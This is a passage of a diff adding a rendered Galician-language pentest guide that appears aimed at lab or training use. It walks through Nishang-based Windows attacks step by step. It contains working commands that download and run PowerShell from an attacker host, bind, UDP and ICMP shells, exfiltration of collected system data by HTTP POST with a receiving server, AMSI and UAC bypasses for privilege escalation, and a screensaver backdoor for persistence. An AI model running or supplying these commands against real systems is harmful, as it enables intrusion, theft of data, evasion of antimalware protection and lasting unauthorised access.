+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="c1"># Cambiar o porto se é necesario</span>
+</span></code></pre></div></p>
+<p><strong>Paso 3</strong> - Executar na vítima (queda escoitando):
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/Shells/Invoke-PowerShellTcpOneLineBind.ps1&#39;)&quot;</span>
+</span></code></pre></div></p>
+<p><strong>Paso 4</strong> - Conectar desde Kali:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>nc<span class="w"> </span>&lt;IP_VITIMA&gt;<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div></p>
+<p><strong>Paso 5</strong> - Limpeza (eliminar regra firewall):
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="nb">Remove-NetFirewallRule</span> <span class="n">-DisplayName</span> <span class="s2">&quot;Allow TCP 4444&quot;</span>
+</span></code></pre></div></p>
+<h4 id="opcion-d-reverse-shell-udp">Opción D: Reverse Shell UDP</h4>
+<p>Útil para evadir firewalls que só monitorizan TCP.</p>
+<p><strong>Paso 1</strong> - Escoitar UDP no Kali:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>nc<span class="w"> </span>-ulvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div></p>
+<p><strong>Paso 2</strong> - Executar na vítima:
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/Shells/Invoke-PowerShellUdp.ps1&#39;);Invoke-PowerShellUdp -Reverse -IPAddress 10.10.14.5 -Port 4444&quot;</span>
+</span></code></pre></div></p>
+<h4 id="opcion-e-icmp-shell-icmpsh-avanzado-e-limitado">Opción E: ICMP Shell (icmpsh) - AVANZADO E LIMITADO</h4>
+<p><strong>IMPORTANTE:</strong> <code>Invoke-PowerShellIcmp.ps1</code> de Nishang <strong>NON funciona</strong> (envía paquetes ICMP baleiros). Para ICMP shells hai que usar o cliente <code>icmpsh.exe</code> do proxecto <a href="https://github.com/inquisb/icmpsh">icmpsh</a>.</p>
+<p><strong>Setup inicial (só primeira vez):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># 1. Instalar Python 2 e dependencias</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>python2<span class="w"> </span>python2-dev<span class="w"> </span>-y
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="c1"># 2. Instalar virtualenv</span>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>sudo<span class="w"> </span>python2<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>virtualenv
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a>
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="c1"># 3. Clonar icmpsh</span>
+</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/inquisb/icmpsh.git
+</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a><span class="nb">cd</span><span class="w"> </span>icmpsh
+</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a>
+</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a><span class="c1"># 4. Crear entorno virtual</span>
+</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a>python2<span class="w"> </span>-m<span class="w"> </span>virtualenv<span class="w"> </span>venv_icmpsh
+</span><span id="__span-40-13"><a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a>
+</span><span id="__span-40-14"><a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a><span class="c1"># 5. Activar e instalar impacket</span>
+</span><span id="__span-40-15"><a id="__codelineno-40-15" name="__codelineno-40-15" href="#__codelineno-40-15"></a><span class="nb">source</span><span class="w"> </span>venv_icmpsh/bin/activate
+</span><span id="__span-40-16"><a id="__codelineno-40-16" name="__codelineno-40-16" href="#__codelineno-40-16"></a>pip<span class="w"> </span>install<span class="w"> </span><span class="nv">setuptools</span><span class="o">==</span><span class="m">44</span>.1.1
+</span><span id="__span-40-17"><a id="__codelineno-40-17" name="__codelineno-40-17" href="#__codelineno-40-17"></a>pip<span class="w"> </span>install<span class="w"> </span><span class="nv">impacket</span><span class="o">==</span><span class="m">0</span>.9.24
+</span><span id="__span-40-18"><a id="__codelineno-40-18" name="__codelineno-40-18" href="#__codelineno-40-18"></a>deactivate
+</span></code></pre></div></p>
+<p><strong>Uso:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="nb">cd</span><span class="w"> </span>~/icmpsh
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="c1"># Activar entorno virtual</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="nb">source</span><span class="w"> </span>venv_icmpsh/bin/activate
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="c1"># Desactivar ICMP echo (CRÍTICO!)</span>
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>sudo<span class="w"> </span>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.icmp_echo_ignore_all<span class="o">=</span><span class="m">1</span>
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="c1"># Executar listener</span>
+</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a>sudo<span class="w"> </span><span class="k">$(</span>which<span class="w"> </span>python<span class="k">)</span><span class="w"> </span>icmpsh_m.py<span class="w"> </span><span class="m">10</span>.10.14.5<span class="w"> </span>&lt;IP_VICTIMA&gt;
+</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a>
+</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a><span class="c1"># Ao rematar: restaurar</span>
+</span><span id="__span-41-13"><a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a>sudo<span class="w"> </span>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.icmp_echo_ignore_all<span class="o">=</span><span class="m">0</span>
+</span><span id="__span-41-14"><a id="__codelineno-41-14" name="__codelineno-41-14" href="#__codelineno-41-14"></a>deactivate
+</span></code></pre></div></p>
+<p><strong>Na vítima (Windows):</strong></p>
+<p>Copiar <code>icmpsh.exe</code> ao sistema:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="c1"># No Kali - Servir ficheiro</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="nb">cd</span><span class="w"> </span>~/icmpsh
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8080</span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c"># No Windows - Descargar executable</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span><span class="p">:</span><span class="n">8080</span><span class="p">/</span><span class="n">icmpsh</span><span class="p">.</span><span class="n">exe</span> <span class="n">-OutFile</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">icmpsh</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="c"># Executar</span>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">icmpsh</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span>
+</span></code></pre></div></p>
+<p><strong>Nota:</strong> Este método require <strong>transferir un executable</strong> ao Windows, eliminando a vantaxe de "execución en memoria" de PowerShell. Por isto e polas limitacións mencionadas, <strong>recoméndase usar TCP OneLine ou UDP de Nishang</strong> en seu lugar.</p>
+<h4 id="comparacion-de-shells">Comparación de Shells</h4>
+<table>
+<thead>
+<tr>
+<th>Tipo</th>
+<th>Vantaxes</th>
+<th>Desvantaxes</th>
+<th>Uso Recomendado</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>TCP Reverse</strong></td>
+<td>Estándar, fiable</td>
+<td>Detectable por firewalls</td>
+<td>Uso xeral</td>
+</tr>
+<tr>
+<td><strong>TCP OneLine</strong></td>
+<td>Máis estable, sen funcións</td>
+<td>Require editar script</td>
+<td><strong>RECOMENDADO</strong></td>
+</tr>
+<tr>
+<td><strong>Bind Shell</strong></td>
+<td>Elude firewall de saída</td>
+<td>Require abrir porto</td>
+<td>Redes con firewall saída estrito</td>
+</tr>
+<tr>
+<td><strong>UDP</strong></td>
+<td>Evade firewalls só TCP</td>
+<td>Menos fiable</td>
+<td>Evasión de firewall</td>
+</tr>
+<tr>
+<td><strong>ICMP</strong></td>
+<td>Moi sigilosa</td>
+<td>Lenta, complexa, <strong>non usa Nishang</strong></td>
+<td>Sigilo máximo (casos moi específicos)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="escenario-2-recoleccion-de-informacion-exfiltracion">Escenario 2: Recolección de Información + Exfiltración</h3>
+<h4 id="metodo-en-memoria-recomendado">Método en Memoria (Recomendado)</h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="c"># Descargar e executar en memoria (sen tocar disco)</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/Gather/Get-Information.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="c"># Recoller información</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="nv">$info</span> <span class="p">=</span> <span class="nb">Get-Information</span>
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="c"># Gardar temporalmente se é necesario</span>
+</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a><span class="nv">$info</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">info</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a>
+</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a><span class="c"># Exfiltrar por HTTP POST</span>
+</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a><span class="nb">Invoke-RestMethod</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span><span class="n">data</span> <span class="n">-Method</span> <span class="n">Post</span> <span class="n">-Body</span> <span class="nv">$info</span>
+</span></code></pre></div>
+<p><strong>Servidor receptor no Kali:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c1"># Opción simple con netcat</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">8000</span><span class="w"> </span>&gt;<span class="w"> </span>datos_exfiltrados.txt
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="c1"># Opción con servidor Python</span>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="c1"># server.py</span>
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>server.py<span class="w"> </span><span class="s">&lt;&lt;EOF</span>
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="s">from http.server import BaseHTTPRequestHandler, HTTPServer</span>
+</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a>
+</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="s">class RequestHandler(BaseHTTPRequestHandler):</span>
+</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="s">    def do_POST(self):</span>
+</span><span id="__span-45-11"><a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a><span class="s">        # Ler a lonxitude dos datos enviados</span>
+</span><span id="__span-45-12"><a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a><span class="s">        content_length = int(self.headers[&#39;Content-Length&#39;])</span>
+</span><span id="__span-45-13"><a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a><span class="s">        # Ler os datos</span>
+</span><span id="__span-45-14"><a id="__codelineno-45-14" name="__codelineno-45-14" href="#__codelineno-45-14"></a><span class="s">        post_data = self.rfile.read(content_length)</span>
+</span><span id="__span-45-15"><a id="__codelineno-45-15" name="__codelineno-45-15" href="#__codelineno-45-15"></a>
+</span><span id="__span-45-16"><a id="__codelineno-45-16" name="__codelineno-45-16" href="#__codelineno-45-16"></a><span class="s">        print(&quot;\n[+] Datos recibidos:&quot;)</span>
+</span><span id="__span-45-17"><a id="__codelineno-45-17" name="__codelineno-45-17" href="#__codelineno-45-17"></a><span class="s">        print(post_data.decode(&#39;utf-8&#39;))</span>
+</span><span id="__span-45-18"><a id="__codelineno-45-18" name="__codelineno-45-18" href="#__codelineno-45-18"></a>
+</span><span id="__span-45-19"><a id="__codelineno-45-19" name="__codelineno-45-19" href="#__codelineno-45-19"></a><span class="s">        # Responder ao cliente (PowerShell) para que non de erro</span>
+</span><span id="__span-45-20"><a id="__codelineno-45-20" name="__codelineno-45-20" href="#__codelineno-45-20"></a><span class="s">        self.send_response(200)</span>
+</span><span id="__span-45-21"><a id="__codelineno-45-21" name="__codelineno-45-21" href="#__codelineno-45-21"></a><span class="s">        self.end_headers()</span>
+</span><span id="__span-45-22"><a id="__codelineno-45-22" name="__codelineno-45-22" href="#__codelineno-45-22"></a><span class="s">        self.wfile.write(b&quot;Datos recibidos correctamente&quot;)</span>
+</span><span id="__span-45-23"><a id="__codelineno-45-23" name="__codelineno-45-23" href="#__codelineno-45-23"></a>
+</span><span id="__span-45-24"><a id="__codelineno-45-24" name="__codelineno-45-24" href="#__codelineno-45-24"></a><span class="s">def run(server_class=HTTPServer, handler_class=RequestHandler, port=8000):</span>
+</span><span id="__span-45-25"><a id="__codelineno-45-25" name="__codelineno-45-25" href="#__codelineno-45-25"></a><span class="s">    server_address = (&#39;&#39;, port)</span>
+</span><span id="__span-45-26"><a id="__codelineno-45-26" name="__codelineno-45-26" href="#__codelineno-45-26"></a><span class="s">    httpd = server_class(server_address, handler_class)</span>
+</span><span id="__span-45-27"><a id="__codelineno-45-27" name="__codelineno-45-27" href="#__codelineno-45-27"></a><span class="s">    print(f&quot;[*] Escoitando no porto {port}...&quot;)</span>
+</span><span id="__span-45-28"><a id="__codelineno-45-28" name="__codelineno-45-28" href="#__codelineno-45-28"></a><span class="s">    try:</span>
+</span><span id="__span-45-29"><a id="__codelineno-45-29" name="__codelineno-45-29" href="#__codelineno-45-29"></a><span class="s">        httpd.serve_forever()</span>
+</span><span id="__span-45-30"><a id="__codelineno-45-30" name="__codelineno-45-30" href="#__codelineno-45-30"></a><span class="s">    except KeyboardInterrupt:</span>
+</span><span id="__span-45-31"><a id="__codelineno-45-31" name="__codelineno-45-31" href="#__codelineno-45-31"></a><span class="s">        pass</span>
+</span><span id="__span-45-32"><a id="__codelineno-45-32" name="__codelineno-45-32" href="#__codelineno-45-32"></a><span class="s">    httpd.server_close()</span>
+</span><span id="__span-45-33"><a id="__codelineno-45-33" name="__codelineno-45-33" href="#__codelineno-45-33"></a>
+</span><span id="__span-45-34"><a id="__codelineno-45-34" name="__codelineno-45-34" href="#__codelineno-45-34"></a><span class="s">if __name__ == &#39;__main__&#39;:</span>
+</span><span id="__span-45-35"><a id="__codelineno-45-35" name="__codelineno-45-35" href="#__codelineno-45-35"></a><span class="s">    run()</span>
+</span><span id="__span-45-36"><a id="__codelineno-45-36" name="__codelineno-45-36" href="#__codelineno-45-36"></a><span class="s">EOF</span>
+</span><span id="__span-45-37"><a id="__codelineno-45-37" name="__codelineno-45-37" href="#__codelineno-45-37"></a>
+</span><span id="__span-45-38"><a id="__codelineno-45-38" name="__codelineno-45-38" href="#__codelineno-45-38"></a><span class="c1"># Executar servidor</span>
+</span><span id="__span-45-39"><a id="__codelineno-45-39" name="__codelineno-45-39" href="#__codelineno-45-39"></a>python3<span class="w"> </span>server.py
+</span></code></pre></div></p>
+<h3 id="escenario-3-bypass-uac-escalada-de-privilexios">Escenario 3: Bypass UAC + Escalada de Privilexios</h3>
+<h4 id="secuencia-completa-en-memoria">Secuencia Completa en Memoria</h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c"># Paso 1: Bypass AMSI primeiro (desactiva protección antimalware)</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/Bypass/Invoke-AmsiBypass.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="nb">Invoke-AmsiBypass</span>
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="c"># Paso 2: Bypass UAC (elevar privilexios sen prompt)</span>
+</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/Escalation/Invoke-PsUACme.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="nb">Invoke-PsUACme</span> <span class="n">-method</span> <span class="n">oobe</span> <span class="n">-Verbose</span>
+</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a>
+</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a><span class="c"># Paso 3: Shell con privilexios elevados</span>
+</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/Shells/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-46-11"><a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span> <span class="n">-Port</span> <span class="n">5555</span>
+</span></code></pre></div>
+<p><strong>No Kali (escoitar o novo porto elevado):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>rlwrap<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">5555</span>
+</span></code></pre></div></p>
+<h4 id="verificar-privilexios">Verificar Privilexios</h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c"># Antes do bypass</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="c"># Despois do bypass (deberías ver privilexios elevados)</span>
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="c"># Busca: SeDebugPrivilege, SeImpersonatePrivilege</span>
+</span></code></pre></div>
+<h4 id="metodos-alternativos-de-uac-bypass">Métodos Alternativos de UAC Bypass</h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c"># Método 1: OOBE</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="nb">Invoke-PsUACme</span> <span class="n">-method</span> <span class="n">oobe</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="c"># Método 2: CompMgmtLauncher</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="nb">Invoke-PsUACme</span> <span class="n">-method</span> <span class="n">CompMgmtLauncher</span>
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>
+</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="c"># Método 3: Sysprep</span>
+</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a><span class="nb">Invoke-PsUACme</span> <span class="n">-method</span> <span class="n">sysprep</span>
+</span><span id="__span-49-9"><a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a>
+</span><span id="__span-49-10"><a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a><span class="c"># Listar todos os métodos dispoñibles</span>
+</span><span id="__span-49-11"><a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a><span class="nb">Invoke-PsUACme</span> <span class="n">-Verbose</span>
+</span></code></pre></div>
+<h3 id="escenario-4-persistencia">Escenario 4: Persistencia</h3>
+<h4 id="opcion-a-backdoor-en-screensaver-en-memoria">Opción A: Backdoor en Screensaver (En Memoria)</h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c"># Descargar e executar</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/Backdoors/Add-ScrnSaveBackdoor.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="c"># Configurar backdoor no screensaver</span>
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="nb">Add-ScrnSaveBackdoor</span> <span class="n">-PayloadURL</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span><span class="p">/</span><span class="n">payload</span><span class="p">.</span><span class="n">ps1</span>
+</span></code></pre></div>
+<h4 id="opcion-b-http-backdoor-polling-periodico">Opción B: HTTP Backdoor (Polling Periódico)</h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="c"># Descarga e carga</span>
